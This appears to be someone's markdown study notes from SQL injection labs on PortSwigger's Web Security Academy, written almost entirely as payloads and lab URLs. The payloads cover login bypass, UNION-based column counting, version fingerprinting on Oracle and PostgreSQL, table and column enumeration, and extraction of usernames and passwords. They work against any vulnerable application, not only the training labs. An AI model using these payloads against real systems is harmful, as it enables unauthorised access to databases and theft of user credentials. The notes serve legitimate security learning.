Retrieve hidden data by using
 ```
' or 1=1
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Login bypass by commenting out the password 
```
admin' --
```

Determine number of column used null or 1,2,3 sequence. Can also used 

```
' ORDER BY 1,2,3--
' union select null,null,null--
https://0aab002f04a6474080a2a97900bd0024.web-security-academy.net/filter?category=Accessories%27%20union%20select%20null,null,null--
```


Making union select the string 'GcERMy'
```
' union select null,'STRING',null--
https://0a81003d044ab76680ef4edc00bf00ef.web-security-academy.net/filter?category=Corporate+gifts%27%20union%20select%20null,%27GcERMy%27,null--
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ec273ed4-ddca-46ce-8908-7eceb2c10fc8)



Select other tables using union sqli
```
https://0a4b004c03f7078280975d21009c00f7.web-security-academy.net/filter?category=Accessories%27%20union%20select%20username,%20password%20from%20users--

' union select username, password from users--
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8f644657-7dca-46b8-a834-35b7cfa93448)


Concatenation  and selecting all in one line 
```
' UNION SELECT NULL, username|| '-' ||password FROM users--
```

Union select using oracle db to get version
```
' union select oracle null,banner from v$version--
https://0a70003b03e2b8c181f99d1a00d30003.web-security-academy.net/filter?category=Corporate+gifts%27union%20select%20null,banner%20from%20v$version--
```

Union select using POSTGRES
Find version
```
'union select  null,null--
'union select null,version()--
```

Select tables names
```
https://0aa700af049a156f813a161d009f0030.web-security-academy.net/filter?category=Accessories%27union+select+null,+table_name+FROM+information_schema.tables--
Accessories'union+select+null,+table_name+FROM+information_schema.tables--
```

Enumerating table column
```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_zhnnxo'--
```

Enumerating from table
```
Accessories'union+sELECT+username_pxclfo,+password_cbbjws+from+users_zhnnxo--
```

Union select using oracle
```
Select version
Accessories' union select null, banner  from v$version--
```

Listing tables
```
Accessories' union select null, table_name from all_tables--
USERS_WNMCED
```

Listing columns from tables
```
Accessories' union select null, column_name FROM all_tab_columns WHERE table_name ='USERS_WNMCED'--
Accessories'+union+select+null,+column_name+FROM+all_tab_columns+WHERE+table_name+%3d'USERS_WNMCED'--
PASSWORD_VTSYPI USERNAME_DNIQTT
```

Selecting from tables
```
Accessories'+union+select+USERNAME_DNIQTT,+PASSWORD_VTSYPI+from+USERS_WNMCED--
```

